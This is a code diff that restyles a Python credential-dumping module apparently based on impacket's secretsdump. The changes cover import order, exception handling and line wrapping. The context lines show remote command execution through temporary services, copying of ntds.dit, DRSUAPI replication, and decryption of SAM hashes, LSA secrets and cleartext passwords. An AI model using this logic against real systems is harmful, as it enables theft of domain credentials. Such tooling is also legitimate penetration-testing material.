@@ -1,8 +1,8 @@
 from __future__ import division
 from __future__ import print_function
+
 import codecs
 import hashlib
-import logging
 import ntpath
 import os
 import random
@@ -13,32 +13,31 @@ from collections import OrderedDict
 from datetime import datetime
 from struct import unpack, pack
 
-from impacket.smbconnection import SMBConnection
-from six import b, PY2
-from lib.logger import logger
-
-from impacket import LOG
 from impacket import system_errors
 from impacket import winregistry, ntlm
+from impacket.crypto import transformKey
 from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
-from impacket.dcerpc.v5.dtypes import NULL
-from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.dcerpc.v5.dcom import wmi
 from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
     VARIANT, VARENUM, DISPATCH_METHOD
 from impacket.dcerpc.v5.dcomrt import DCOMConnection, OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
     OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
     IRemUnknown2, INTERFACE
-from impacket.ese import ESENT_DB
+from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.dpapi import DPAPI_SYSTEM
-from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ
+from impacket.ese import ESENT_DB
+from impacket.krb5 import constants
+from impacket.krb5.crypto import string_to_key
 from impacket.nt_errors import STATUS_MORE_ENTRIES
+from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ
+from impacket.smbconnection import SMBConnection
 from impacket.structure import Structure
 from impacket.structure import hexdump
 from impacket.uuid import string_to_bin
-from impacket.crypto import transformKey
-from impacket.krb5 import constants
-from impacket.krb5.crypto import string_to_key
+from six import b, PY2
+
+from lib.logger import logger
 
 try:
     from Cryptodome.Cipher import DES, ARC4, AES
@@ -415,8 +414,8 @@ class RemoteOperations:
         request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
         drs = drsuapi.DRS_EXTENSIONS_INT()
         drs['cb'] = len(drs)  # - 4
-        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | \
-                         drsuapi.DRS_EXT_STRONG_ENCRYPTION
+        drs['dwFlags'] = (drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 |
+                          drsuapi.DRS_EXT_GETCHGREQ_V8 | drsuapi.DRS_EXT_STRONG_ENCRYPTION)
         drs['SiteObjGuid'] = drsuapi.NULLGUID
         drs['Pid'] = 0
         drs['dwReplEpoch'] = 0
@@ -526,10 +525,10 @@ class RemoteOperations:
 
         try:
             resp = samr.hSamrEnumerateUsersInDomain(self.__samr, self.__domainHandle,
-                                                    userAccountControl=samr.USER_NORMAL_ACCOUNT | \
-                                                                       samr.USER_WORKSTATION_TRUST_ACCOUNT | \
-                                                                       samr.USER_SERVER_TRUST_ACCOUNT | \
-                                                                       samr.USER_INTERDOMAIN_TRUST_ACCOUNT,
+                                                    userAccountControl=(samr.USER_NORMAL_ACCOUNT |
+                                                                        samr.USER_WORKSTATION_TRUST_ACCOUNT |
+                                                                        samr.USER_SERVER_TRUST_ACCOUNT |
+                                                                        samr.USER_INTERDOMAIN_TRUST_ACCOUNT),
                                                     enumerationContext=enumerationContext)
         except DCERPCException as e:
             if str(e).find('STATUS_MORE_ENTRIES') < 0:
@@ -590,7 +589,7 @@ class RemoteOperations:
                 return '%s\\%s' % (domain, username)
             else:
                 return username
-        except:
+        except Exception as _:
             return None
 
     def getServiceAccount(self, serviceName):
@@ -679,7 +678,7 @@ class RemoteOperations:
                 scmr.hRCloseServiceHandle(self.__scmr, self.__serviceHandle)
                 scmr.hRCloseServiceHandle(self.__scmr, self.__scManagerHandle)
                 rpc.disconnect()
-            except Exception as e:
+            except Exception as _:
                 # If service is stopped it'll trigger an exception
                 # If service does not exist it'll trigger an exception
                 # So. we just wanna be sure we delete it, no need to
@@ -736,7 +735,7 @@ class RemoteOperations:
         keyHandle = ans['phkResult']
         try:
             dataType, noLMHash = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'NoLmHash')
-        except:
+        except Exception as _:
             noLMHash = 0
 
         if noLMHash != 1:
@@ -752,7 +751,7 @@ class RemoteOperations:
         regHandle = ans['phKey']
         try:
             ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hiveName)
-        except:
+        except Exception as _:
             raise Exception("Can't open %s hive" % hiveName)
         keyHandle = ans['phkResult']
         rrp.hBaseRegSaveKey(self.__rrp, keyHandle, tmpFileName)
@@ -777,7 +776,7 @@ class RemoteOperations:
         service = resp['lpServiceHandle']
         try:
             scmr.hRStartServiceW(self.__scmr, service)
-        except:
+        except Exception as _:
             pass
         scmr.hRDeleteService(self.__scmr, service)
         self.__serviceDeleted = True
@@ -889,8 +888,8 @@ class RemoteOperations:
 
     def __executeRemote(self, data):
         self.__tmpServiceName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
-        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + \
-                  self.__shell + self.__batchFile
+        command = (self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' +
+                   self.__batchFile + ' & ' + self.__shell + self.__batchFile)
         command += ' & ' + 'del ' + self.__batchFile
 
         logger.debug('ExecuteRemote command: %s' % command)
@@ -954,7 +953,7 @@ class RemoteOperations:
             ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle,
                                       'SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters')
             keyHandle = ans['phkResult']
-        except:
+        except Exception as _:
             # Can't open the registry path, assuming no NTDS on the other end
             return None
 
@@ -962,7 +961,7 @@ class RemoteOperations:
             dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DSA Database file')
             ntdsLocation = dataValue[:-1]
             ntdsDrive = ntdsLocation[:2]
-        except:
+        except Exception as _:
             # Can't open the registry path, assuming no NTDS on the other end
             return None
 
@@ -985,7 +984,7 @@ class RemoteOperations:
             shouldRemove = False
 
         # Now copy the ntds.dit to the temp directory
-        tmpFileName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.tmp'
+        tmpFileName = ''.join([random.choice(string.ascii_letters) for z in range(8)]) + '.tmp'
 
         self.__executeRemote(
             '%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))
@@ -1136,7 +1135,8 @@ class SAMHashes(OfflineRegistry):
                 raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')
 
         elif domainData['Key0'][0:1] == b'\x02':
-            # This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also)
+            # This is Windows 2016 TP5 on in theory (it is
+            # reported that some W10 and 2012R2 might behave this way also)
             samKeyData = SAM_KEY_DATA_AES(domainData['Key0'])
 
             self.__hashedBootKey = self.__cryptoCommon.decryptAES(self.__bootKey,
@@ -1181,7 +1181,7 @@ class SAMHashes(OfflineRegistry):
         # Remove the Names item
         try:
             rids.remove('Names')
-        except:
+        except Exception as _:
             pass
 
         for rid in rids:
@@ -1378,7 +1378,7 @@ class LSASecrets(OfflineRegistry):
         try:
             # Remove unnecessary value
             values.remove(b'NL$Control')
-        except:
+        except Exception as _:
             pass
 
         iterationCount = 10240
@@ -1451,7 +1451,7 @@ class LSASecrets(OfflineRegistry):
             # Let's first try to decode the secret
             try:
                 strDecoded = secretItem.decode('utf-16le')
-            except:
+            except Exception as _:
                 pass
             else:
                 # We have to get the account the service
@@ -1471,7 +1471,7 @@ class LSASecrets(OfflineRegistry):
             # Let's first try to decode the secret
             try:
                 strDecoded = secretItem.decode('utf-16le')
-            except:
+            except Exception as _:
                 pass
             else:
                 # We have to get the account this password is for
@@ -1488,7 +1488,7 @@ class LSASecrets(OfflineRegistry):
         elif upperName.startswith('ASPNET_WP_PASSWORD'):
             try:
                 strDecoded = secretItem.decode('utf-16le')
-            except:
+            except Exception as _:
                 pass
             else:
                 secret = 'ASPNET: %s' % strDecoded
@@ -1580,7 +1580,7 @@ class LSASecrets(OfflineRegistry):
         try:
             # Remove unnecessary value
             keys.remove(b'NL$Control')
-        except:
+        except Exception as _:
             pass
 
         if self.__LSAKey == b'':
@@ -1836,7 +1836,7 @@ class NTDSHashes:
         while True:
             try:
                 record = self.__ESEDB.getNextRow(self.__cursor)
-            except:
+            except Exception as _:
                 logger.error('Error while calling getNextRow(), trying the next one')
                 continue
 
@@ -1886,9 +1886,11 @@ class NTDSHashes:
                 pos, cur_index = 0, 0
                 while True:
                     pek_entry = decryptedPekList['DecryptedPek'][pos:pos + 20]
-                    if len(pek_entry) < 20: break  # if list truncated, should not happen
+                    if len(pek_entry) < 20:
+                        break  # if list truncated, should not happen
                     index, pek = unpack('<L16s', pek_entry)
-                    if index != cur_index: break  # break on non-sequential index
+                    if index != cur_index:
+                        break  # break on non-sequential index
                     self.__PEK.append(pek)
                     logger.info("PEK # %d found and decrypted: %s", index, hexlify(pek).decode('utf-8'))
                     cur_index += 1
@@ -1969,7 +1971,7 @@ class NTDSHashes:
                     if attr['AttrVal']['valCount'] > 0:
                         try:
                             domain = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
-                        except:
+                        except Exception as _:
                             domain = None
                     else:
                         domain = None
@@ -1977,7 +1979,7 @@ class NTDSHashes:
                     if attr['AttrVal']['valCount'] > 0:
                         try:
                             userName = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
-                        except:
+                        except Exception as _:
                             logger.error(
                                 'Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC'][
                                                                          'StringName'][:-1])
@@ -1999,7 +2001,7 @@ class NTDSHashes:
         if haveInfo is True:
             try:
                 userProperties = samr.USER_PROPERTIES(plainText)
-            except:
+            except Exception as _:
                 # On some old w2k3 there might be user properties that don't
                 # match [MS-SAMR] structure, discarding them
                 return
@@ -2031,7 +2033,8 @@ class NTDSHashes:
                             self.__writeOutput(keysFile, answer + '\n')
                 elif userProperty['PropertyName'].decode('utf-16le') == 'Primary:CLEARTEXT':
                     # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property
-                    # This credential type is the cleartext password. The value format is the UTF-16 encoded cleartext password.
+                    # This credential type is the cleartext password.
+                    # The value format is the UTF-16 encoded cleartext password.
                     try:
                         answer = "%s:CLEARTEXT:%s" % (
                             userName, unhexlify(userProperty['PropertyValue']).decode('utf-16le'))
@@ -2199,7 +2202,7 @@ class NTDSHashes:
                     if attr['AttrVal']['valCount'] > 0:
                         try:
                             domain = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
-                        except:
+                        except Exception as _:
                             domain = None
                     else:
                         domain = None
@@ -2207,7 +2210,7 @@ class NTDSHashes:
                     if attr['AttrVal']['valCount'] > 0:
                         try:
                             userName = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
-                        except:
+                        except Exception as _:
                             logger.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC'][
                                                                                   'StringName'][:-1])
                             userName = 'unknown'
@@ -2228,7 +2231,7 @@ class NTDSHashes:
                         try:
                             pwdLastSet = self.__fileTimeToDateTime(
                                 unpack('<Q', b''.join(attr['AttrVal']['pAVal'][0]['pVal']))[0])
-                        except:
+                        except Exception as _:
                             logger.error(
                                 'Cannot get pwdLastSet for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][
                                                                  :-1])
@@ -2317,7 +2320,7 @@ class NTDSHashes:
                     if self.__remoteOps is not None:
                         try:
                             self.__remoteOps.connectSamr(self.__remoteOps.getMachineNameAndDomain()[1])
-                        except:
+                        except Exception as _:
                             if os.getenv('KRB5CCNAME') is not None and self.__justUser is not None:
                                 # RemoteOperations failed. That might be because there was no way to log into the
                                 # target system. We just have a last resort. Hope we have tickets cached and that they
@@ -2367,7 +2370,7 @@ class NTDSHashes:
                                     "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                                 logger.error(str(e))
                                 pass
-                            except:
+                            except Exception as _:
                                 logger.error("Error while processing row!")
                                 logger.error(str(e))
                                 pass
@@ -2376,7 +2379,7 @@ class NTDSHashes:
                     while True:
                         try:
                             record = self.__ESEDB.getNextRow(self.__cursor)
-                        except:
+                        except Exception as _:
                             logger.error('Error while calling getNextRow(), trying the next one')
                             continue
 
@@ -2394,7 +2397,7 @@ class NTDSHashes:
                                     "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                                 logger.error(str(e))
                                 pass
-                            except:
+                            except Exception as _:
                                 logger.error("Error while processing row!")
                                 logger.error(str(e))
                                 pass
@@ -2416,7 +2419,8 @@ class NTDSHashes:
                 if self.__justUser is not None:
                     # Depending on the input received, we need to change the formatOffered before calling
                     # DRSCrackNames.
-                    # There are some instances when you call -just-dc-user and you receive ERROR_DS_NAME_ERROR_NOT_UNIQUE
+                    # There are some instances when you call -just-dc-user and
+                    # you receive ERROR_DS_NAME_ERROR_NOT_UNIQUE
                     # That's because we don't specify the domain for the user (and there might be duplicates)
                     # Always remember that if you specify a domain, you should specify the NetBIOS domain name,
                     # not the FQDN. Just for this time. It's confusing I know, but that's how this API works.
@@ -2432,8 +2436,10 @@ class NTDSHashes:
 
                     if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                         if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
-                            raise Exception("%s: %s" % system_errors.ERROR_MESSAGES[
-                                0x2114 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
+                            raise Exception("Error: %s" % system_errors.ERROR_MESSAGES[0x2114 +
+                                                                                       crackedName['pmsgOut']['V1']
+                                                                                       ['pResult']['rItems'][0]
+                                                                                       ['status']])
 
                         userRecord = self.__remoteOps.DRSGetNCChanges(
                             crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
@@ -2470,7 +2476,8 @@ class NTDSHashes:
                                 if resumeSid == userSid.formatCanonical():
                                     # Match!, next round we will back processing
                                     logger.debug(
-                                        'resumeSid %s reached! processing users from now on' % userSid.formatCanonical())
+                                        'resumeSid %s reached! processing users'
+                                        ' from now on' % userSid.formatCanonical())
                                     resumeSid = None
                                 else:
                                     logger.debug(
@@ -2488,7 +2495,7 @@ class NTDSHashes:
 
                             if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                                 if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
-                                    logger.error("%s: %s" % system_errors.ERROR_MESSAGES[
+                                    logger.error("Error: %s" % system_errors.ERROR_MESSAGES[
                                         0x2114 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
                                     break
                                 userRecord = self.__remoteOps.DRSGetNCChanges(
@@ -2717,8 +2724,8 @@ class DumpSecrets:
                             and self.__doKerberos is True:
                         # Giving some hints here when SPN target name validation is set to something different to Off
                         # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
-                        logger.error(
-                            'Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
+                        logger.error('Policy SPN target name validation might be '
+                                     'restricting full DRSUAPI dump. Try -just-dc-user')
                     else:
                         logger.error('RemoteOperations failed: %s' % str(e))
 
@@ -2813,7 +2820,7 @@ class DumpSecrets:
                             os.unlink(resumeFile)
             try:
                 self.cleanup()
-            except:
+            except Exception as _:
                 pass
 
     def cleanup(self):
